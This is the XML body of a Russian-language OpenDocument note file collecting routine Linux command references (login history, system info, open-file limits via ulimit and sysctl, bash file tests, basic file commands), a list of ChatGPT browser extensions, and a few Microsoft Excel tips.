      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uptime</text:span><text:span text:style-name="T3"> - показать время с момента последней загрузки ОС.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> - сведения о пользователях, зарегистрировавшихся в системе</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">users</text:span><text:span text:style-name="T3"> - список имен пользователей, вошедших в систему.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - список пользователей, вошедших в систему по данным из специального файла /</text:span><text:span text:style-name="T2">var</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">log</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wtmp</text:span><text:span text:style-name="T3">. Отображается имя, терминал, время входа </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адрес и т.п.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">ad</text:span><text:span text:style-name="T3"> - сведения о пользователях, вошедших в систему, с отображением в последней колонке имени компьютера с которого выполнен вход.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">F</text:span><text:span text:style-name="T3"> - отобразить время входа пользователей в систему, длительность сессий и время выхода.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> - отобразить сведения о выключениях, перезагрузках и изменениях уровня запуска системы.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3"> - отобразить сведения о сеансах пользователя </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 10 </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">1 - отобразить сведения о десяти последних сеансах пользователя </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">1.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lastlog</text:span><text:span text:style-name="T3"> - отобразить список всех пользователей и время их последнего входа в систему.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">whoami</text:span><text:span text:style-name="T3"> - имя, под которым вы в данный момент работаете в системе.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">finger</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> - показать информацию о </text:span><text:span text:style-name="T2">user</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - отобразить все сведения о системе.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">vr</text:span><text:span text:style-name="T3"> - отобразить номер выпуска операционной системы и версию ядра.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">df</text:span><text:span text:style-name="T3"> - отобразить информацию об использовании дисков.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">du</text:span><text:span text:style-name="T3"> - отобразить информацию об использовании текущего каталога</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3"> - информация об использовании реальной и виртуальной памяти.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whatis</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> - отобразить краткую информацию об </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> из базы данных документации.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whereis</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> - где находится исполняемый модуль </text:span><text:span text:style-name="T2">app</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">which</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> - какой исполняемый модуль приложения </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> будет запущен по умолчанию.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">man</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">command</text:span><text:span text:style-name="T3"> - отобразить справочную информацию для команды </text:span><text:span text:style-name="T2">command</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как найти количество открытых файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1">Значение сохраняется в</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2"><text:span text:style-name="T3">Проверка </text:span><text:span text:style-name="T2">Hard</text:span><text:span text:style-name="T3"> лимит в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ulimit</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">Hn</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Проверка </text:span><text:span text:style-name="T2">Soft</text:span><text:span text:style-name="T3"> лимит в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ulimit</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">Sn</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Чтобы просмотреть значения </text:span><text:span text:style-name="T2">Hard</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Soft</text:span><text:span text:style-name="T3"> для разных пользователей, переключите пользователя с «</text:span><text:span text:style-name="T2">su</text:span><text:span text:style-name="T3">» на пользователя, ограничения которого вы хотите проверить.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Например:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># su root</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Sn</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P21" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">Как проверить количество системных дескрипторов файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">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text:span><text:span text:style-name="T2">MySQL</text:span><text:span text:style-name="T3"> / </text:span><text:span text:style-name="T2">MariaDB</text:span><text:span text:style-name="T3"> или веб-сервер </text:span><text:span text:style-name="T2">Apache</text:span><text:span text:style-name="T3">. Вы можете увеличить лимит открытых файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, отредактировав опцию ядра </text:span><text:span text:style-name="T2">fs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">max</text:span><text:span text:style-name="T3">. Для этого используйте утилиту </text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Sysctl</text:span><text:span text:style-name="T3"> используется для настройки параметров ядра. Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду:</text:span></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2"><text:span text:style-name="T3">С помощью указанной команды изменения, которые вы внесли, будут оставаться активными только до следующей перезагрузки. Если вы хотите </text:span><text:soft-page-break/><text:span text:style-name="T3">применить их на постоянной основе, вам придется отредактировать следующий файл:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">vi</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">conf</text:span></text:p>
      <text:p text:style-name="P1">Добавьте следующую команду:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">fs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">max</text:span><text:span text:style-name="T3">=500000</text:span></text:p>
      <text:p text:style-name="P1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</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1">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p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">p</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установка количества открытых файлов для пользователя в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">. 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text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3">, вам необходимо отредактировать следующий файл:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">vi</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">security</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">limits</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">conf</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если вы администратор </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">,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text:span></text:p>
      <text:p text:style-name="P1">Команды, которые вы должны добавить, имеют следующие параметры:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">&gt; </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3">&gt; </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">item</text:span><text:span text:style-name="T3">&gt; </text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">value</text:span><text:span text:style-name="T3">&gt;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вот пример установки </text:span><text:span text:style-name="T2">Soft</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Hard</text:span><text:span text:style-name="T3"> лимитов для пользователя </text:span><text:span text:style-name="T2">dimon</text:span><text:span text:style-name="T3">:</text:spa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11" loext:marker-style-name="T1"><text:span text:style-name="T2">dimon soft nofile 1024</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Bash. </text:span><text:span text:style-name="T3">Проверки</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файлов</text:span><text:span text:style-name="T2">. K</text:span><text:span text:style-name="T3">оманды позволяют проверять различные условия, касающиеся файлов:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли он директорией.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли он файлом.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и доступен ли он для чтения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и не является ли он пустым.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и доступен ли он для записи.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли он исполняемым.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 -</text:span><text:span text:style-name="T2">nt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 # Проверяет, новее ли </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1, чем </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 -</text:span><text:span text:style-name="T2">ot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 # Проверяет, старше ли </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1, чем </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">O</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли его владельцем текущий пользователь.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">G</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и соответствует ли его идентификатор группы идентификатору группы текущего пользователя.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">#!/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">mydir</text:span><text:span text:style-name="T3">=/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">likegeeks</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">if</text:span><text:span text:style-name="T3"> [ -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">mydir</text:span><text:span text:style-name="T3"> ] <text:s text:c="19"/># если файл сущетсвует и он является директорией</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">then</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "The $mydir directory exists" # выводим сообщение</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">mydir</text:span><text:span text:style-name="T3"> <text:s text:c="25"/># переходим в него </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> <text:s text:c="33"/># отображаем содержимое</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">else <text:s text:c="31"/># ИНАЧЕ</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "The $mydir directory does not exist"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">fi</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Подборка </text:span><text:span text:style-name="T2">Chat</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">GPT</text:span><text:span text:style-name="T3"> расширений для браузера:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">DetectGPT</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detectgpt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">detect</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">chat</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">gpt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">oadkgbgppkhoaaoepjbcnjejmkknaobg</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">related</text:span><text:span text:style-name="T3">) - определяет текст, написанный нейросетью. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">CheatScrub</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">GPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Detector</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">addons</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">mozilla</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">en</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">US</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">firefox</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">addon</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cheatscrub</text:span><text:span text:style-name="T3">/) - аналогичный аддон, но с более широким функционалом. (</text:span><text:span text:style-name="T2">Firefox</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Search</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Engines</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">chatonai</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/) - интеграция </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> в поисковую строку браузера. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Firefox</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Edge</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">Ghostwrite</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Email</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Assistant</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ghostwrite</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">chatgpt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">email</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fbjnnjochaopepfjpngghafgnafebkjh</text:span><text:span text:style-name="T3">) - умный почтовый помощник, пишущий письма. (С</text:span><text:span text:style-name="T2">hrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">Casper</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">AI</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casper</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fgfiokgecpkambjildjleljjcihnocel</text:span><text:span text:style-name="T3">) - умный помощник для различных задач. Например, может сделать саммари из статьи. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Writer</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">chatgptwriter</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/) - работает на всех страницах, исправляет ошибки, пишет тексты, саммари и т.д. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T2">GPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Sheets</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">workspace</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">google</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">marketplace</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">gpt</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">sheets</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">and</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">docs</text:span><text:span text:style-name="T3">/677318054654) - гугл-таблицы на стероидах. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">chatgpt</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">youtube</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ru</text:span><text:span text:style-name="T3">) - делает краткое содержание </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3"> роликов. (С</text:span><text:span text:style-name="T2">hrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">9. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">File</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Uploader</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Extended</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chatgpt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">uploader</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">becfinhbfclcgokjlobojlnldbfillpf</text:span><text:span text:style-name="T3">) - позволяет загружать файлы в </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3">. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">10. </text:span><text:span text:style-name="T2">editGPT</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">editgpt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">/) - позволяет редактировать текст, выдаваемый нейросетью. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Firefox</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Edge</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P22">Шпаргалка по работе в командной строке. Команды для работы с файлами:</text:p>
      <text:p text:style-name="P1">ls - вывод содержимого каталога;</text:p>
      <text:p text:style-name="P1">ls -la - вывод содержимого каталога в форматированном виде (в т.ч. скрытые файлы);</text:p>
      <text:p text:style-name="P1">cd dir - перейти в каталог dir;</text:p>
      <text:p text:style-name="P1">cd - перейти в домашний каталог;</text:p>
      <text:p text:style-name="P1">pwd - показать текущий каталог;</text:p>
      <text:p text:style-name="P1">mkdir dir - создать каталог dir;</text:p>
      <text:p text:style-name="P1">rm file - удалить файл;</text:p>
      <text:p text:style-name="P1">rm -r dir - удалить каталог dir;</text:p>
      <text:p text:style-name="P1">rm -f file - принудительно удалить файл;</text:p>
      <text:p text:style-name="P1">rm -rf dir - принудительно удалить каталог dir;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cp file1 file2 - </text:span><text:span text:style-name="T3">скопировать</text:span><text:span text:style-name="T2"> file1 </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> file2;</text:span></text:p>
      <text:p text:style-name="P1">cp -r dir1 dir2 - скопировать каталог dir1 в каталог dir2 (если каталога dir2 нет, он будет создан);</text:p>
      <text:p text:style-name="P1">mv file1 file2 - переместить (или переименовать, если file1 и file2 находятся в одном каталоге) file1 в file2;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ln -s file link - </text:span><text:span text:style-name="T3">создать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">симлинк</text:span><text:span text:style-name="T2"> link </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> file;</text:span></text:p>
      <text:p text:style-name="P1">touch file - создать файл;</text:p>
      <text:p text:style-name="P1">cat &gt; file - направить стандартный ввод в file;</text:p>
      <text:p text:style-name="P1">more file - вывод содержимого file;</text:p>
      <text:p text:style-name="P1">head file - вывод содержимого первых 10 строк file;</text:p>
      <text:p text:style-name="P1">tail file - вывод содержимого последних 10 строк file;</text:p>
      <text:p text:style-name="P7">tail -f file - вывод содержимого file по мере появления, начиная с последних 10 строк файла.</text:p>
      <text:p text:style-name="P1">5 хаков в Microsoft Excel, которые ускорят работу. Для всех, кто перестал бояться таблиц и полюбил Excel, собрали самые удачные подсказки по работе в нем:</text:p>
      <text:p text:style-name="P1">- Как быстро поменять местами столбцы или строки?</text:p>
      <text:p text:style-name="P1">Выберите нужный столбец и переместите курсор на границу диапазона - он сменится на крестик. Зажмите левую кнопку мыши и потяните диапазон влево; по зеленой границе будет видно, куда переедет столбец или строка, если вы отпустите курсор.</text:p>
      <text:p text:style-name="P1">- Как не печатать запятые в десятичной дроби?</text:p>
      <text:p text:style-name="P1">Допустим, ваши значения в файле состоят исключительно из десятичных дробей. Откройте меню «Файл» - «Параметры» - «Дополнительно». Отметьте чекбокс «Автоматическая вставка десятичной запятой» и количество знаков после запятой. Excel будет автоматически отделять запятой последние N знаков.</text:p>
      <text:p text:style-name="P1">- Как легко растянуть колонки под размер содержимого?</text:p>
      <text:p text:style-name="P1">Выделите нужные ячейки, нажмите Alt, H, O, I.</text:p>
